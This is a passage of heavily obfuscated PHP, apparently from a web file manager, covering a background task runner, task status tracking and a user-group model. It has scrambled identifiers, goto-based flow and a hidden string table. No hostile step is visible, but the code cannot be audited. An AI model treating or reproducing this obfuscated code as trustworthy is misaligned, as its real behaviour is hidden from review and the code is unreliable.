$dËäÔ™³Éˆ = time() - strtotime(date($B¿¥à†ˆó[1503]) . $B¿¥à†ˆó[1504]); $c¯‚ºõß…ğ = $dËäÔ™³Éˆ >= $d³È ‹›ê && $dËäÔ™³Éˆ <= $d³È ‹›ê + 3600; goto Cäğâš˜æ; b«ĞŸŸœƒ“: } private static function closeDatabase() { goto Aî¿÷”É®; Aî¿÷”É®: $Eá Ïí²µ’ =& $_SERVER[Ç³Íß¦Ó]; static $EØáÄßôíó = 0; $AÃ¶´Æñçô = 1800; goto D•Í¶Ïó» ; D•Í¶Ïó» : if (!$EØáÄßôíó) { $EØáÄßôíó = time(); } if (time() - $EØáÄßôíó < $AÃ¶´Æñçô) { return; } $EØáÄßôíó = time(); goto e”„÷Í”øé; e”„÷Í”øé: $bˆËÂôì× = Model($Eá Ïí²µ’[501])->db($Eá Ïí²µ’[33]); if ($bˆËÂôì×) { $bˆËÂôì×->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($Eá Ïí²µ’[1510], $Eá Ïí²µ’[1511]); die; } goto aóéæ§ºá; aóéæ§ºá: } public static function taskRun($a½ë»±…ãË) { goto A¬ÅŒ…à; C‹‚ã«¿‚ö: Model($f²¸¹ ¤­É[1516])->add(array($f²¸¹ ¤­É[1517] => $f²¸¹ ¤­É[33], $f²¸¹ ¤­É[1518] => $f²¸¹ ¤­É[495], $f²¸¹ ¤­É[29] => $f²¸¹ ¤­É[1519] . $a½ë»±…ãË[$f²¸¹ ¤­É[392]], $f²¸¹ ¤­É[1520] => json_encode(array($f²¸¹ ¤­É[28] => $a½ë»±…ãË[$f²¸¹ ¤­É[28]], $f²¸¹ ¤­É[1521] => timeFloat() - $CùŸ‘“³Öµ, $f²¸¹ ¤­É[290] => $bàÜ¯¦‘Æ)))); self::log($f²¸¹ ¤­É[1522] . $a½ë»±…ãË[$f²¸¹ ¤­É[392]] . $f²¸¹ ¤­É[1523] . $bàÜ¯¦‘Æ); return !0; goto Fó•çˆ½½Ş; C²šÖóøæ‘: $CùŸ‘“³Öµ = timeFloat(); $bàÜ¯¦‘Æ = $f²¸¹ ¤­É[33]; switch ($a½ë»±…ãË[$f²¸¹ ¤­É[29]]) { case $f²¸¹ ¤­É[304]: $dªœÁ“·Ö£ = url_request($a½ë»±…ãË[$f²¸¹ ¤­É[1515]], $f²¸¹ ¤­É[227], !1, !1, !1, !1, 5); $bàÜ¯¦‘Æ = strlen($dªœÁ“·Ö£); break; case $f²¸¹ ¤­É[226]: $bàÜ¯¦‘Æ = Hook::apply($a½ë»±…ãË[$f²¸¹ ¤­É[1515]]); default: break; } goto C‹‚ã«¿‚ö; A¬ÅŒ…à: $f²¸¹ ¤­É =& $_SERVER[Ç³Íß¦Ó]; self::log($f²¸¹ ¤­É[1512] . $a½ë»±…ãË[$f²¸¹ ¤­É[392]] . $f²¸¹ ¤­É[1513] . $a½ë»±…ãË[$f²¸¹ ¤­É[28]] . $f²¸¹ ¤­É[1514] . $a½ë»±…ãË[$f²¸¹ ¤­É[1515]]); Model($f²¸¹ ¤­É[1496])->run($a½ë»±…ãË[$f²¸¹ ¤­É[392]]); goto C²šÖóøæ‘; Fó•çˆ½½Ş: } private static function valueGet($D¿ê–¼…·Š) { $AéğŸÖøí =& $_SERVER[Ç³Íß¦Ó]; $d±Ş›¬‰Æ = $AéğŸÖøí[1524]; $eÒ…ÁŞÙ½£ = Model($AéğŸÖøí[1525])->get($D¿ê–¼…·Š, $d±Ş›¬‰Æ); if (is_null($eÒ…ÁŞÙ½£)) { Model($AéğŸÖøí[1525])->set($AéğŸÖøí[714], $AéğŸÖøí[87], $d±Ş›¬‰Æ); Model($AéğŸÖøí[1525])->set($AéğŸÖøí[1490], $AéğŸÖøí[495], $d±Ş›¬‰Æ); $eÒ…ÁŞÙ½£ = Model($AéğŸÖøí[1525])->get($D¿ê–¼…·Š, $d±Ş›¬‰Æ); } return $eÒ…ÁŞÙ½£; } private static function valueSet($aô–À°¸‡’, $d¢¨Ú¬Ã‚ª) { $AˆÂ¸êã  =& $_SERVER[Ç³Íß¦Ó]; return Model($AˆÂ¸êã [1525])->set($aô–À°¸‡’, $d¢¨Ú¬Ã‚ª, $AˆÂ¸êã [1524]); } protected static function log($d¸ŞÀ„õ) { write_log($d¸ŞÀ„õ, $_SERVER[Ç³Íß¦Ó][1511]); } private static function cacheClear() { $fÛ†¿ÄèÂ× =& $_SERVER[Ç³Íß¦Ó]; $EŸÉ¹ùÆ™ = Model($fÛ†¿ÄèÂ×[1525])->cacheKey($fÛ†¿ÄèÂ×[1524]); Cache::clearMemory($EŸÉ¹ùÆ™); Model($fÛ†¿ÄèÂ×[1496])->cacheClear(); } } class Task { const STATYS_STOP = "\163\164\157\x70"; const STATYS_RUNNING = "\x72\x75\x6e\156\151\156\147"; const STATYS_KILL = "\x6b\x69\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($BÉ‰¯ˆ…ˆµ, $DÑ÷ìá®§ = '', $c”Œ‚…‘ = 0, $f¢ˆİèšØ = '') { goto fğ‰ŞÚò®©; Cô“íÑ„ï: $GLOBALS[$aŞÚ‹Šš¬Ö[1532]] = 1; Hook::bind($aŞÚ‹Šš¬Ö[1492], array($this, $aŞÚ‹Šš¬Ö[1533])); Hook::bind($aŞÚ‹Šš¬Ö[1534], array($this, $aŞÚ‹Šš¬Ö[1535])); goto E¶ç¤¹¾š¦; E¶ç¤¹¾š¦: $this->startAfter(); Hook::trigger($aŞÚ‹Šš¬Ö[1536], $this->task); $this->task[$aŞÚ‹Šš¬Ö[1529]] = timeFloat(); goto C²ò×Ş¡™ô; fğ‰ŞÚò®©: $aŞÚ‹Šš¬Ö =& $_SERVER[Ç³Íß¦Ó]; if (self::get($BÉ‰¯ˆ…ˆµ)) { return; } $this->task = array($aŞÚ‹Šš¬Ö[392] => $BÉ‰¯ˆ…ˆµ, $aŞÚ‹Šš¬Ö[1526] => USER_ID, $aŞÚ‹Šš¬Ö[1432] => $f¢ˆİèšØ, $aŞÚ‹Šš¬Ö[29] => $DÑ÷ìá®§, $aŞÚ‹Šš¬Ö[1023] => $aŞÚ‹Šš¬Ö[33], $aŞÚ‹Šš¬Ö[1021] => $c”Œ‚…‘, $aŞÚ‹Šš¬Ö[1036] => 0, $aŞÚ‹Šš¬Ö[1527] => 0, $aŞÚ‹Šš¬Ö[1528] => 0, $aŞÚ‹Šš¬Ö[750] => timeFloat(), $aŞÚ‹Šš¬Ö[749] => 0, $aŞÚ‹Šš¬Ö[1529] => 0, $aŞÚ‹Šš¬Ö[1530] => 0, $aŞÚ‹Šš¬Ö[1531] => 0, $aŞÚ‹Šš¬Ö[714] => $aŞÚ‹Šš¬Ö[1490]); goto Cô“íÑ„ï; C²ò×Ş¡™ô: } public function end() { goto c½á“Ë²¦; CØ¸ß–Ì½á: $F¹¹ÇêŒµ¶ = timeFloat() - $this->task[$C‚âø¶ßØ[750]]; self::log($C‚âø¶ßØ[1537] . $this->task[$C‚âø¶ßØ[392]] . $C‚âø¶ßØ[1538] . $F¹¹ÇêŒµ¶ . $C‚âø¶ßØ[1539]); Hook::unbind($C‚âø¶ßØ[1492], array($this, $C‚âø¶ßØ[1533])); goto d‘Ğ²×„”; d‘Ğ²×„”: Hook::unbind($C‚âø¶ßØ[1534], array($this, $C‚âø¶ßØ[1535])); $this->endAfter(); $this->task = !1; goto F‘®Å½ƒ; c½á“Ë²¦: $C‚âø¶ßØ =& $_SERVER[Ç³Íß¦Ó]; if (!$this->task) { return; } if ($this->task[$C‚âø¶ßØ[1529]]) { self::valueSet($this->task[$C‚âø¶ßØ[392]], !1); } goto CØ¸ß–Ì½á; F‘®Å½ƒ: } public function update($FçŸåçÕ = 0, $d¿…Úµóî« = false) { goto d‰‹„¿µä; DÎïÃ–ŸºÄ: $E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[714]] = $BîÉ¥‹†ùõ ? $BîÉ¥‹†ùõ : $E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[714]]; $E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[1530]] = $föàÓè¢‚Ã[$AÎ¨¶½…‚[1530]] ? $föàÓè¢‚Ã[$AÎ¨¶½…‚[1530]] : 0; $E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[1529]] = timeFloat(); goto C†‰”ªÙ; d‰‹„¿µä: $AÎ¨¶½…‚ =& $_SERVER[Ç³Íß¦Ó]; $E¢óˆÈğ’ˆ =& $this->task; if (!$E¢óˆÈğ’ˆ) { return; } goto AçÎ­—Ã‚; C†‰”ªÙ: Hook::trigger($AÎ¨¶½…‚[1543], $E¢óˆÈğ’ˆ); self::valueSet($E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[392]], $E¢óˆÈğ’ˆ); goto A¹¥Éñ‘³¹; E¬«Ø²¹ê–: $föàÓè¢‚Ã = self::get($E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[392]]); $BîÉ¥‹†ùõ = $föàÓè¢‚Ã[$AÎ¨¶½…‚[714]]; if ($BîÉ¥‹†ùõ == self::STATYS_KILL) { $bİ¡»µÏ = array($AÎ¨¶½…‚[1540] => LNG($AÎ¨¶½…‚[1541]), $AÎ¨¶½…‚[1086] => !1); Cache::set($AÎ¨¶½…‚[1542] . $this->task[$AÎ¨¶½…‚[392]], $bİ¡»µÏ, 30); $this->end(); die; } else { if ($BîÉ¥‹†ùõ == self::STATYS_STOP) { $føá‘†¨ = 2; $föàÓè¢‚Ã[$AÎ¨¶½…‚[1530]] += $føá‘†¨; self::valueSet($E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[392]], $föàÓè¢‚Ã); sleep($føá‘†¨); $this->update(); return; } } goto DÎïÃ–ŸºÄ; DÛæĞ…ÎÑ: $this->updateAfter(); $Cæé¼Şõ¡ò = 0.2; if (timeFloat() - $E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[1529]] < $Cæé¼Şõ¡ò && !$d¿…Úµóî«) { return; } goto E¬«Ø²¹ê–; AçÎ­—Ã‚: $E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[1036]] += $FçŸåçÕ; $E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[749]] = timeFloat(); if ($E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[1021]]) { if ($E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[1021]] < $E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[1036]]) { $E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[1021]] = $E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[1036]]; } $Eˆñ¤ÚèÔ = timeFloat() - $E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[750]] - $E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[1530]]; $E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[1527]] = $E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[1036]] / $E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[1021]]; $E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[1528]] = $E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[1036]] / $Eˆñ¤ÚèÔ; if ($E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[1527]] > 0) { $E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[1531]] = $Eˆñ¤ÚèÔ * (1 - $E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[1527]]) / $E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[1527]]; } $E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[1531]] = $E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[1531]] <= 0 ? 0 : $E¢óˆÈğ’ˆ[$AÎ¨¶½…‚[1531]]; } goto DÛæĞ…ÎÑ; A¹¥Éñ‘³¹: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($d†÷ÌŠæ‹¼) { $aÑ¸Œ¿çà¬ =& $_SERVER[Ç³Íß¦Ó]; Cache::set($aÑ¸Œ¿çà¬[1542] . $this->task[$aÑ¸Œ¿çà¬[392]], $d†÷ÌŠæ‹¼, 60); return $d†÷ÌŠæ‹¼; } public static function get($dŠ¯»—’°) { return self::valueGet($dŠ¯»—’°); } public static function listData() { $d«òõ˜†ÆÂ = self::valueGet(); return array_sort_by($d«òõ˜†ÆÂ, $_SERVER[Ç³Íß¦Ó][750], !0); } public static function kill($bÓÇÓ´ŞŸô) { return self::changeStatus($bÓÇÓ´ŞŸô, self::STATYS_KILL); } public static function stop($A±Ğ¤Îö¹è) { return self::changeStatus($A±Ğ¤Îö¹è, self::STATYS_STOP); } public static function restart($A¢ÆŒ°›êÏ) { return self::changeStatus($A¢ÆŒ°›êÏ, self::STATYS_RUNNING); } public static function killAll() { $e´¡¹ƒÇğ =& $_SERVER[Ç³Íß¦Ó]; $déÀ‹³Éôš = self::listData(); foreach ($déÀ‹³Éôš as $BêØË‡ä°Ú) { self::kill($BêØË‡ä°Ú[$e´¡¹ƒÇğ[392]]); } sleep(2); foreach ($déÀ‹³Éôš as $BêØË‡ä°Ú) { self::valueSet($BêØË‡ä°Ú[$e´¡¹ƒÇğ[392]], !1); } } private static function changeStatus($Bö¼½¦Œ‹Õ, $e’ôôšµÏ™) { goto dËñ¦¬Âí”; dËñ¦¬Âí”: $eˆÊ‡‰”ƒ“ =& $_SERVER[Ç³Íß¦Ó]; $a‡»Ñæ¿ëã = self::valueGet($Bö¼½¦Œ‹Õ); if (!$a‡»Ñæ¿ëã) { return !1; } goto aÓñƒ„ø¤í; aÓñƒ„ø¤í: $a‡»Ñæ¿ëã[$eˆÊ‡‰”ƒ“[714]] = $e’ôôšµÏ™; self::valueSet($Bö¼½¦Œ‹Õ, $a‡»Ñæ¿ëã); self::log($eˆÊ‡‰”ƒ“[1544] . $a‡»Ñæ¿ëã[$eˆÊ‡‰”ƒ“[392]] . $eˆÊ‡‰”ƒ“[1545] . $e’ôôšµÏ™); goto EÄ‚Ã«­ô‘; EÄ‚Ã«­ô‘: return !0; goto b‰ß·”ÛÅ; b‰ß·”ÛÅ: } public static function valueGet($fĞøŒ¨‹Šª = false) { $bÒ¢¢©´ôõ =& $_SERVER[Ç³Íß¦Ó]; if ($fĞøŒ¨‹Šª) { $FÆŞ¡‰òŞ = Model($bÒ¢¢©´ôõ[423])->where(array($bÒ¢¢©´ôõ[93] => $fĞøŒ¨‹Šª, $bÒ¢¢©´ôõ[29] => $bÒ¢¢©´ôõ[1546]))->find(); return $FÆŞ¡‰òŞ ? json_decode($FÆŞ¡‰òŞ[$bÒ¢¢©´ôõ[371]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($b±õ‹ ª†İ = false) { goto cô×½•Êæ; bÎ‰Û‹—ì„: $Aíá¼ù» = Model($f¯õ‘ˆÈĞ[423])->where($CÜÉ–˜ï×ë)->select(); $Aíá¼ù» = $Aíá¼ù» ? $Aíá¼ù» : array(); foreach ($Aíá¼ù» as $A‚­·–‘É => $d‘‡£–Ñ­Ã) { $Aíá¼ù»[$A‚­·–‘É] = json_decode($d‘‡£–Ñ­Ã[$f¯õ‘ˆÈĞ[371]], !0); } goto CÚ¢¾ĞÈ•¯; cô×½•Êæ: $f¯õ‘ˆÈĞ =& $_SERVER[Ç³Íß¦Ó]; $CÜÉ–˜ï×ë = array($f¯õ‘ˆÈĞ[29] => $f¯õ‘ˆÈĞ[1546]); if ($b±õ‹ ª†İ) { $CÜÉ–˜ï×ë[$f¯õ‘ˆÈĞ[1526]] = $b±õ‹ ª†İ; } goto bÎ‰Û‹—ì„; CÚ¢¾ĞÈ•¯: return $Aíá¼ù»; goto A£ñƒ›í¬Ô; A£ñƒ›í¬Ô: } public static function valueSet($d¼¢İÏÆİ, $aÕ®‹‰é­) { goto eë‘óééºò; bÒÇ“÷ÃŸ: Model($d¨‡‰î§ñ´[423])->add($AĞƒ¬ˆÄŒ, array(), !0); goto DëÆ¯âÉ’â; C‹åƒŒ¨Ô´: if (!$b‚—Ø×Ïøä) { ob_start(); var_dump($aÕ®‹‰é­); $DÖ¬†ããª = ob_get_clean(); self::log($d¨‡‰î§ñ´[1547] . json_encode_force($DÖ¬†ããª)); } if (!$d¼¢İÏÆİ || !$aÕ®‹‰é­[$d¨‡‰î§ñ´[392]]) { return !1; } $AĞƒ¬ˆÄŒ = array($d¨‡‰î§ñ´[29] => $d¨‡‰î§ñ´[1546], $d¨‡‰î§ñ´[1526] => USER_ID, $d¨‡‰î§ñ´[93] => $d¼¢İÏÆİ, $d¨‡‰î§ñ´[371] => $b‚—Ø×Ïøä); goto bÒÇ“÷ÃŸ; eë‘óééºò: $d¨‡‰î§ñ´ =& $_SERVER[Ç³Íß¦Ó]; if (!$aÕ®‹‰é­) { return Model($d¨‡‰î§ñ´[423])->where(array($d¨‡‰î§ñ´[93] => $d¼¢İÏÆİ, $d¨‡‰î§ñ´[29] => $d¨‡‰î§ñ´[1546]))->delete(); } $b‚—Ø×Ïøä = json_encode($aÕ®‹‰é­); goto C‹åƒŒ¨Ô´; DëÆ¯âÉ’â: } public static function log($D—§©‚—½­) { if (!GLOBAL_DEBUG) { return; } write_log($D—§©‚—½­, $_SERVER[Ç³Íß¦Ó][1548]); } } goto Eâ†ÂÓ¨î; cÜè»ó¸ùâ: class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\x75\160"; protected $tableMeta = array("\x74\141\x62\154\145\x4e\141\x6d\x65" => "\x67\x72\x6f\x75\x70\137\155\x65\x74\141", "\155\x65\164\141\x46\151\145\x6c\144" => "\147\x72\x6f\x75\160\x49\104"); protected function cacheFunctionAlias($a•ƒ¾‡ƒÆŸ) { $Dš×½Ñå«¢ =& $_SERVER[Ç³Íß¦Ó]; return array($Dš×½Ñå«¢[1759] => array($a•ƒ¾‡ƒÆŸ[0], $Dš×½Ñå«¢[1760]), $Dš×½Ñå«¢[1761] => array($a•ƒ¾‡ƒÆŸ[0], $Dš×½Ñå«¢[1760])); } protected function getInfo($cŠğÏğÑÎ) { $CĞè‘ÄôÂ“ = $this->getInfoSimple($cŠğÏğÑÎ); if (!$CĞè‘ÄôÂ“) { return !1; } return $this->_listDataApplyItem($CĞè‘ÄôÂ“); } protected function getInfoSimple($bÉøÕÈËˆ‚, $CÎ·¶ŒÜÃñ = false) { $C‹÷÷šÏŸ =& $_SERVER[Ç³Íß¦Ó]; if ($CÎ·¶ŒÜÃñ) { $dÏàÉøÏÈ = array($C‹÷÷šÏŸ[1689] => intval($bÉøÕÈËˆ‚)); $CÊîøâèïÌ = $this->where($dÏàÉøÏÈ)->find(); return is_array($CÊîøâèïÌ) ? $CÊîøâèïÌ : array(); } return $this->cacheFunctionGet($C‹÷÷šÏŸ[1762], $bÉøÕÈËˆ‚); } protected function groupAdd($b´å£ë„õ) { goto DùÚ»Ù£¿É; e„¹†¡‚÷ï: if ($CÄà‹ì‰ñ‡[$bÊĞä…‘·…[485]]) { $F©À°÷öã® = $CÄà‹ì‰ñ‡[$bÊĞä…‘·…[485]] . $CÄà‹ì‰ñ‡[$bÊĞä…‘·…[1689]] . $bÊĞä…‘·…[47]; } $cÜ­½Çßä = array($bÊĞä…‘·…[411] => $this->groupNameAuto($b´å£ë„õ[$bÊĞä…‘·…[476]], $b´å£ë„õ[$bÊĞä…‘·…[28]]), $bÊĞä…‘·…[393] => $b´å£ë„õ[$bÊĞä…‘·…[476]], $bÊĞä…‘·…[552] => $F©À°÷öã®, $bÊĞä…‘·…[1763] => $b´å£ë„õ[$bÊĞä…‘·…[1673]], $bÊĞä…‘·…[1764] => 0, $bÊĞä…‘·…[1693] => 0); if (isset($b´å£ë„õ[$bÊĞä…‘·…[1712]])) { $cÜ­½Çßä[$bÊĞä…‘·…[1712]] = $b´å£ë„õ[$bÊĞä…‘·…[1712]]; } else { $dÉ¡ÒŸÂæ = $this->max($bÊĞä…‘·…[1712]); if (!$dÉ¡ÒŸÂæ) { $dÉ¡ÒŸÂæ = 0; } $cÜ­½Çßä[$bÊĞä…‘·…[1712]] = $dÉ¡ÒŸÂæ + 1; } goto DÙÀùäÍï; DùÚ»Ù£¿É: $bÊĞä…‘·… =& $_SERVER[Ç³Íß¦Ó]; if (!$b´å£ë„õ[$bÊĞä…‘·…[476]] && isset($b´å£ë„õ[$bÊĞä…‘·…[1689]]) && $b´å£ë„õ[$bÊĞä…‘·…[1689]] == 1) { if ($CÄà‹ì‰ñ‡ = $this->getInfoSimple($b´å£ë„õ[$bÊĞä…‘·…[1689]], !0)) { return $b´å£ë„õ[$bÊĞä…‘·…[1689]]; } } else { $CÄà‹ì‰ñ‡ = $this->getInfoSimple($b´å£ë„õ[$bÊĞä…‘·…[476]]); if (!$CÄà‹ì‰ñ‡) { return !1; } } $F©À°÷öã® = $bÊĞä…‘·…[497]; goto e„¹†¡‚÷ï; cœ¿¸­·ß: if (isset($b´å£ë„õ[$bÊĞä…‘·…[1765]])) { $this->metaSet($A¨ğ’èïŠ“, array($bÊĞä…‘·…[1765] => $b´å£ë„õ[$bÊĞä…‘·…[1765]], $bÊĞä…‘·…[1766] => $b´å£ë„õ[$bÊĞä…‘·…[1766]])); unset($b´å£ë„õ[$bÊĞä…‘·…[1765]]); unset($b´å£ë„õ[$bÊĞä…‘·…[1766]]); } Model($bÊĞä…‘·…[1204])->groupRootAdd($A¨ğ’èïŠ“); return $A¨ğ’èïŠ“; goto bù¬°‚‹ƒ‰; DÙÀùäÍï: if (!empty($b´å£ë„õ[$bÊĞä…‘·…[1689]])) { $cÜ­½Çßä[$bÊĞä…‘·…[1689]] = $b´å£ë„õ[$bÊĞä…‘·…[1689]]; } $A¨ğ’èïŠ“ = $this->add($cÜ­½Çßä); $this->setNamePinyin($A¨ğ’èïŠ“, $cÜ­½Çßä[$bÊĞä…‘·…[28]]); goto cœ¿¸­·ß; bù¬°‚‹ƒ‰: } protected function groupEdit($aßÊÂ‡óÕ, $c¡«¶¥¹•¾) { goto c˜“¦ÌÍ; c˜“¦ÌÍ: $a“·â©ÑŸ =& $_SERVER[Ç³Íß¦Ó]; $C–¤ãæï¬ = $this->getInfoSimple($aßÊÂ‡óÕ); if (!$C–¤ãæï¬) { return !1; } goto e“Â“£¦†ˆ; e“Â“£¦†ˆ: if (!empty($c¡«¶¥¹•¾[$a“·â©ÑŸ[476]])) { $Fè ô¥©® = $this->getInfoSimple($c¡«¶¥¹•¾[$a“·â©ÑŸ[476]]); if (!$Fè ô¥©®) { return !1; } if ($C–¤ãæï¬[$a“·â©ÑŸ[1689]] == $Fè ô¥©®[$a“·â©ÑŸ[1689]]) { return !1; } if ($c¡«¶¥¹•¾[$a“·â©ÑŸ[476]] != $C–¤ãæï¬[$a“·â©ÑŸ[476]]) { if ($Fè ô¥©®[$a“·â©ÑŸ[485]] !== $C–¤ãæï¬[$a“·â©ÑŸ[485]] && strpos($Fè ô¥©®[$a“·â©ÑŸ[485]], $C–¤ãæï¬[$a“·â©ÑŸ[485]] . $C–¤ãæï¬[$a“·â©ÑŸ[1689]] . $a“·â©ÑŸ[47]) === 0) { return !1; } $c¡«¶¥¹•¾[$a“·â©ÑŸ[552]] = $Fè ô¥©®[$a“·â©ÑŸ[485]] . $c¡«¶¥¹•¾[$a“·â©ÑŸ[476]] . $a“·â©ÑŸ[47]; $this->_changeChildLevel($C–¤ãæï¬, $Fè ô¥©®); } } if (isset($c¡«¶¥¹•¾[$a“·â©ÑŸ[28]])) { $this->setNamePinyin($aßÊÂ‡óÕ, $c¡«¶¥¹•¾[$a“·â©ÑŸ[28]]); } if (isset($c¡«¶¥¹•¾[$a“·â©ÑŸ[1765]])) { $this->metaSet($aßÊÂ‡óÕ, array($a“·â©ÑŸ[1765] => $c¡«¶¥¹•¾[$a“·â©ÑŸ[1765]], $a“·â©ÑŸ[1766] => $c¡«¶¥¹•¾[$a“·â©ÑŸ[1766]])); unset($c¡«¶¥¹•¾[$a“·â©ÑŸ[1765]]); unset($c¡«¶¥¹•¾[$a“·â©ÑŸ[1766]]); } goto cÉÒñö·…Å; cÉÒñö·…Å: if (isset($c¡«¶¥¹•¾[$a“·â©ÑŸ[28]]) && $c¡«¶¥¹•¾[$a“·â©ÑŸ[28]] != $C–¤ãæï¬[$a“·â©ÑŸ[28]]) { $this->_clearChildrenCache($C–¤ãæï¬); } return $this->where(array($a“·â©ÑŸ[1767] => $aßÊÂ‡óÕ))->save($c¡«¶¥¹•¾); goto F‚ßè±ŒƒŒ; F‚ßè±ŒƒŒ: } private function _clearChildrenCache($DÔá¡¶‹ë) { $f§èîˆ¡Ú¾ =& $_SERVER[Ç³Íß¦Ó]; $F¥­œ¨ = array($f§èîˆ¡Ú¾[552] => array($f§èîˆ¡Ú¾[511], $DÔá¡¶‹ë[$f§èîˆ¡Ú¾[485]] . $DÔá¡¶‹ë[$f§èîˆ¡Ú¾[1689]] . $f§èîˆ¡Ú¾[512])); $dáÂ­§Ú²ì = $this->field($f§èîˆ¡Ú¾[1689])->where($F¥­œ¨)->select(); foreach ($dáÂ­§Ú²ì as $BöîØÔïÙä) { $this->cacheFunctionClear($f§èîˆ¡Ú¾[1768], $BöîØÔïÙä[$f§èîˆ¡Ú¾[1689]]); $this->cacheFunctionClear($f§èîˆ¡Ú¾[1762], $BöîØÔïÙä[$f§èîˆ¡Ú¾[1689]]); } } private function _changeChildLevel($Eòß¼Ô›ÜØ, $F¯›ÏÊì…¨, $f”Å¥¼Ûë = false) { goto Cœ’¥ÒªÏƒ; b¶î¯õë½ö: $this->_clearChildrenCache($Eòß¼Ô›ÜØ); $this->where($A…ë¾õùÄ)->data($DÁèƒÖ¤Åİ)->save(); goto aÑœ¶ŠÒ; Cœ’¥ÒªÏƒ: $E¸Œ¶©¿Š =& $_SERVER[Ç³Íß¦Ó]; $Dªâ¦ß²â = $Eòß¼Ô›ÜØ[$E¸Œ¶©¿Š[485]] . $Eòß¼Ô›ÜØ[$E¸Œ¶©¿Š[1689]] . $E¸Œ¶©¿Š[47]; $Dò§ƒìãø = $F¯›ÏÊì…¨[$E¸Œ¶©¿Š[485]] . $F¯›ÏÊì…¨[$E¸Œ¶©¿Š[1689]] . $E¸Œ¶©¿Š[47] . $Eòß¼Ô›ÜØ[$E¸Œ¶©¿Š[1689]] . $E¸Œ¶©¿Š[47]; goto bœÄÄÇÅÓ‰; bœÄÄÇÅÓ‰: if ($f”Å¥¼Ûë) { $Dò§ƒìãø = $F¯›ÏÊì…¨[$E¸Œ¶©¿Š[485]] . $F¯›ÏÊì…¨[$E¸Œ¶©¿Š[1689]] . $E¸Œ¶©¿Š[47]; } $A…ë¾õùÄ = array($E¸Œ¶©¿Š[552] => array($E¸Œ¶©¿Š[511], $Eòß¼Ô›ÜØ[$E¸Œ¶©¿Š[485]] . $Eòß¼Ô›ÜØ[$E¸Œ¶©¿Š[1689]] . $E¸Œ¶©¿Š[512])); $DÁèƒÖ¤Åİ = array($E¸Œ¶©¿Š[552] => array($E¸Œ¶©¿Š[560], "\x72\x65\x70\154\x61\x63\x65\x28\160\x61\x72\145\x6e\164\x4c\145\166\145\154\x2c\47{$Dªâ¦ß²â}\x27\x2c\47{$Dò§ƒìãø}\x27\51")); goto b¶î¯õë½ö; aÑœ¶ŠÒ: } public function setNamePinyin($Aéæ±°ÈĞ, $bÈèŸÄ…ƒ = false) { $e¶¬·Õ¸áŞ =& $_SERVER[Ç³Íß¦Ó]; if (!$bÈèŸÄ…ƒ) { $FæÌ‚Åâß = $this->getInfoSimple($Aéæ±°ÈĞ); $bÈèŸÄ…ƒ = $FæÌ‚Åâß[$e¶¬·Õ¸áŞ[28]]; } if (!Input::check($bÈèŸÄ…ƒ, $e¶¬·Õ¸áŞ[555])) { $this->metaSet($Aéæ±°ÈĞ, $e¶¬·Õ¸áŞ[442], null); $this->metaSet($Aéæ±°ÈĞ, $e¶¬·Õ¸áŞ[441], null); return; } $D®›Ë Ûˆ = array($e¶¬·Õ¸áŞ[442] => str_replace($e¶¬·Õ¸áŞ[50], $e¶¬·Õ¸áŞ[33], Pinyin::encode($bÈèŸÄ…ƒ)), $e¶¬·Õ¸áŞ[441] => Pinyin::encode($bÈèŸÄ…ƒ, $e¶¬·Õ¸áŞ[556])); $this->metaSet($Aéæ±°ÈĞ, $D®›Ë Ûˆ); } protected function groupStatus($Dší½ØŸ˜, $CÓŒ¯øíŠŸ) { goto A‰Ÿâ×ÑŸ; B›ßöÁÁ«¸: foreach ($DÁíöê¡ as $Dší½ØŸ˜) { $BÂ±¡ÓŞÙÓ[] = array($A×œÚ¬¤ãÆ[1689] => $Dší½ØŸ˜, $A×œÚ¬¤ãÆ[93] => $A×œÚ¬¤ãÆ[714], $A×œÚ¬¤ãÆ[371] => $CÓŒ¯øíŠŸ); } return Model($A×œÚ¬¤ãÆ[1769])->addAll($BÂ±¡ÓŞÙÓ, array(), !0); goto B­¿•å‘Áó; dÛëÑ“¹ƒ•: if ($CÓŒ¯øíŠŸ == $A×œÚ¬¤ãÆ[87]) { $DÁíöê¡ = $this->parentLevelArray($b»‰¤íµ[$A×œÚ¬¤ãÆ[485]]); } else { $A‹Ë·¤½á = array($A×œÚ¬¤ãÆ[552] => array($A×œÚ¬¤ãÆ[511], $b»‰¤íµ[$A×œÚ¬¤ãÆ[485]] . $b»‰¤íµ[$A×œÚ¬¤ãÆ[1689]] . $A×œÚ¬¤ãÆ[512])); $DÁíöê¡ = $this->where($A‹Ë·¤½á)->field($A×œÚ¬¤ãÆ[1689])->select(); $DÁíöê¡ = array_to_keyvalue($DÁíöê¡, $A×œÚ¬¤ãÆ[33], $A×œÚ¬¤ãÆ[1689]); } $DÁíöê¡[] = $b»‰¤íµ[$A×œÚ¬¤ãÆ[1689]]; 